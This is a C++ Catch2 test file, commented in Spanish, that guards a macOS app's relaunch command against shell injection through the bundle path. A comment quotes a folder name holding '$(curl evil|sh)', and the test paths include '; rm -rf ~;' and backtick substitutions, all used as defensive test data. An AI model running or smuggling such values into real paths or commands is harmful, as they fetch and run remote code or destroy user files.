// [supernova][app] — REOPEN tiene que relanzar LA MISMA copia. El 5-sep abrió otra (la 0.1.0 vieja de
// /Applications) porque LaunchServices resuelve por identificador de bundle cuando hay dos registradas.
//
// Y desde 0.3.1: la ruta del bundle JAMÁS se interpola en el script del `sh -c`. Una carpeta llamada
// `SUPERNOVA $(curl evil|sh)` es un nombre de carpeta perfectamente legal, y con la versión vieja
// (concatenación dentro de comillas) el usuario ejecutaba eso al tocar REOPEN. El script es CONSTANTE;
// pid, ruta y herramienta viajan como argumentos posicionales ($1/$2/$3).
#include <catch2/catch_test_macros.hpp>
#include "app/AppRelaunch.h"

namespace {
// Rutas legales y hostiles: sustitución de comandos, backticks, comillas de los dos tipos y espacios.
const char* const kNastyPaths[] = {
    "/Users/musik/Mis Apps/SUPERNOVA.app",
    "/tmp/SUPERNOVA $(echo INJECTED).app",
    "/tmp/SUPERNOVA `echo INJECTED`.app",
    "/tmp/SUPERNOVA \"quoted\".app",
    "/tmp/SUPERNOVA 'single'.app",
    "/tmp/SUPERNOVA; rm -rf ~; echo .app",
};
constexpr int kDeadPid = 999999;   // > kern.maxproc: kill -0 falla ⇒ el waiter no espera a nadie
} // namespace

TEST_CASE ("reopen: el script del sh -c es CONSTANTE — la ruta no entra nunca en él", "[supernova][app]")
{
    for (const auto* path : kNastyPaths)
    {
        const auto argv = supernova::relaunchWaiterCommand (path, 4242);

        REQUIRE (argv[0] == juce::String ("/bin/sh"));
        REQUIRE (argv[1] == juce::String ("-c"));
        REQUIRE_FALSE (argv[2].contains (path));       // ← el agujero de 0.3.0 vivía exactamente acá
        REQUIRE_FALSE (argv[2].contains ("4242"));     // ni siquiera el pid se interpola
    }
}

TEST_CASE ("reopen: pid y ruta viajan INTACTOS como argumentos posicionales", "[supernova][app]")
{
    const auto argv = supernova::relaunchWaiterCommand ("/tmp/SUPERNOVA $(echo INJECTED).app", 4242);

    REQUIRE (argv.contains ("4242"));                                   // $1
    REQUIRE (argv.contains ("/tmp/SUPERNOVA $(echo INJECTED).app"));    // $2, tal cual
    REQUIRE (argv[2].contains ("$1"));                                  // el script los referencia
    REQUIRE (argv[2].contains ("$2"));
    REQUIRE (argv[2].contains ("kill -0"));                             // espera a que ESTE proceso muera
    REQUIRE (argv[2].contains ("-n"));                                  // open -n = instancia NUEVA
}

TEST_CASE ("reopen: corriendo el argv de verdad, el shell NO expande la ruta", "[supernova][app]")
{
    // La herramienta entra por parámetro: en producción /usr/bin/open, acá /bin/echo — así el test ejecuta
    // el MISMO argv que la app y mira qué le llegó al final de la cadena.
    const juce::String path { "/tmp/SUPERNOVA $(echo INJECTED) `echo INJECTED` \"q\".app" };
    const auto argv = supernova::relaunchWaiterCommand (path, kDeadPid, "/bin/echo");

    juce::ChildProcess sh;
    REQUIRE (sh.start (argv));
    const auto out = sh.readAllProcessOutput();

    // `echo -n <ruta>` imprime la ruta y nada más. Si el shell hubiera expandido algo, el literal
    // "$(echo INJECTED)" no estaría (habría quedado "INJECTED" pelado).
    REQUIRE (out.contains ("$(echo INJECTED)"));
    REQUIRE (out.contains ("`echo INJECTED`"));
    REQUIRE (out.trim() == path);
}

TEST_CASE ("reopen: jamás relanza por identificador de bundle", "[supernova][app]")
{
    const auto argv = supernova::relaunchWaiterCommand ("/Applications/SUPERNOVA.app", 7);
    REQUIRE_FALSE (argv.joinIntoString (" ").contains ("-b "));      // open -b <bundle id>
    REQUIRE_FALSE (argv.joinIntoString (" ").contains ("com.ovni.supernova.app"));
}
